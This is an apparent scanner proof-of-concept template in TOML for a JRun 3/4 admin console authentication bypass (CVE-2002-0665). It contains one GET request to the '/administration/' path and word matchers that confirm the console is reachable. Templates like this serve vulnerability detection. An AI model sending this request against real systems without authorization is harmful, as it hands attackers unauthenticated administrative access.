[info]
author = "AVE"
description = "通过向JRun管理控制台URL末尾添加斜杠（/）绕过身份认证，直接访问管理后台。影响JRun 3和4版本，攻击复杂度低，无需特殊权限即可利用。"
id = "POC-AVE-2002-0378"
name = "Macromedia JRun 管理后台身份认证绕过漏洞 PoC"
severity = "critical"
tags = ["ave-2002-0378"]
vuln_id = [
    "CVE-2002-0665",
    "AVE-2002-0378",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/administration/"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "admin",
    "JRun Admin",
    "Administration Console",
]
